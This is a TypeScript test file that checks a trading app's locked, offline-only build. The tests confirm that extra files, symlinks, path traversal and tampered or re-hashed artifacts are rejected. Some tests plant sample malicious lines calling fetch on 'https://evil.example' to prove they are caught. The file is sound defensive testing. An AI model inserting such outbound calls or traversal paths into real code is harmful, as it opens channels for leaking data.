import {
  cpSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  realpathSync,
  rmSync,
  symlinkSync,
  writeFileSync,
} from 'node:fs';
import { tmpdir } from 'node:os';
import { join, resolve } from 'node:path';
import { afterEach, describe, expect, it } from 'vitest';
import { buildLocalTrading } from '../scripts/local-build.ts';
import {
  hash,
  readRegular,
  verifyArtifact,
} from '../scripts/security-policy.ts';

const temporary: string[] = [];
function fixture(): { root: string; output: string } {
  const root = realpathSync(mkdtempSync(join(tmpdir(), 'vest-security-')));
  temporary.push(root);
  for (const directory of [
    'security',
    'apps/local-trading',
    'packages/core/src',
    'packages/risk-engine/src',
    'packages/execution/src',
    'packages/browser-execution/src',
    'packages/simulator/src',
    'packages/host/src',
  ]) {
    cpSync(resolve(directory), join(root, directory), { recursive: true });
  }
  return { root, output: join(root, 'artifact') };
}
afterEach(() =>
  temporary
    .splice(0)
    .forEach((directory) =>
      rmSync(directory, { recursive: true, force: true }),
    ),
);

describe('locked local artifact', () => {
  it('contains only audited inert code and exact policies', async () => {
    const { root, output } = fixture();
    buildLocalTrading(root, output);
    expect(() => verifyArtifact(output)).not.toThrow();
    const source = readFileSync(join(output, 'index.js'), 'utf8');
    const runtime = await import(
      `data:text/javascript;base64,${Buffer.from(source).toString('base64')}`
    );
    expect(runtime.mode).toBe('OFFLINE_ONLY');
    expect(runtime.liveState).toBe('LOCKED');
    expect(() => runtime.armLiveTrading()).toThrow(
      'LIVE_EXECUTION_UNAVAILABLE',
    );
    expect(() => runtime.executeTrade()).toThrow('LIVE_EXECUTION_UNAVAILABLE');
    expect(() => buildLocalTrading(root, output)).toThrow(
      'BUILD_DIRECTORY_NOT_EMPTY',
    );
  });

  it('rejects unknown source files and symlink inputs', () => {
    const { root, output } = fixture();
    writeFileSync(join(root, 'apps/local-trading/extra.ts'), '');
    expect(() => buildLocalTrading(root, output)).toThrow(
      'UNAPPROVED_PRODUCTION_SOURCE',
    );
    rmSync(join(root, 'apps/local-trading/extra.ts'));
    rmSync(join(root, 'apps/local-trading/index.ts'));
    symlinkSync(
      resolve('apps/local-trading/index.ts'),
      join(root, 'apps/local-trading/index.ts'),
    );
    expect(() => buildLocalTrading(root, output)).toThrow('SYMLINK_FORBIDDEN');
  });

  it('rejects unknown files and changed bytes in artifacts', () => {
    const { root, output } = fixture();
    buildLocalTrading(root, output);
    writeFileSync(join(output, 'extra.js'), '');
    expect(() => verifyArtifact(output)).toThrow('UNAPPROVED_ARTIFACT_FILE');
    rmSync(join(output, 'extra.js'));
    writeFileSync(join(output, 'index.js'), 'fetch("https://evil.example")');
    expect(() => verifyArtifact(output)).toThrow('ARTIFACT_HASH_MISMATCH');
  });

  it('rejects malicious emitted code even with recomputed unsigned hashes', () => {
    const { root, output } = fixture();
    buildLocalTrading(root, output);
    const malicious = 'globalThis["fetch"]("https://evil.example");';
    writeFileSync(join(output, 'index.js'), malicious);
    const manifest = JSON.parse(
      readFileSync(join(output, 'manifest.json'), 'utf8'),
    );
    manifest.hashes['index.js'] = hash(malicious);
    writeFileSync(join(output, 'manifest.json'), JSON.stringify(manifest));
    expect(() => verifyArtifact(output)).toThrow('INERT_EXPORT_REQUIRED');
  });

  it('rejects artifact symlinks and traversal', () => {
    const { root, output } = fixture();
    buildLocalTrading(root, output);
    rmSync(join(output, 'index.js'));
    symlinkSync(
      join(root, 'apps/local-trading/index.ts'),
      join(output, 'index.js'),
    );
    expect(() => verifyArtifact(output)).toThrow('SYMLINK_FORBIDDEN');
    expect(() =>
      readRegular(output, '../security/network-policy.json'),
    ).toThrow('PATH_ESCAPE');
    const alias = join(root, 'alias');
    symlinkSync(output, alias);
    expect(() => verifyArtifact(alias)).toThrow();
    const nested = join(root, 'nested');
    mkdirSync(nested);
    symlinkSync(output, join(nested, 'linked'));
    expect(() => readRegular(root, 'nested/linked/index.js')).toThrow(
      'SYMLINK_FORBIDDEN',
    );
  });

  it('refuses an output alias before writing any artifact', () => {
    const { root } = fixture();
    const target = join(root, 'empty');
    mkdirSync(target);
    const alias = join(root, 'output-link');
    symlinkSync(target, alias);
    expect(() => buildLocalTrading(root, alias)).toThrow(
      'OUTPUT_SYMLINK_FORBIDDEN',
    );
    expect(() => readFileSync(join(target, 'index.js'))).toThrow();
  });

  it('rejects unscanned source formats in protected packages', () => {
    const { root, output } = fixture();
    writeFileSync(
      join(root, 'packages/execution/src/extra.js'),
      'fetch("https://evil.example")',
    );
    expect(() => buildLocalTrading(root, output)).toThrow(
      'UNAPPROVED_EXECUTION_SOURCE',
    );
  });
});
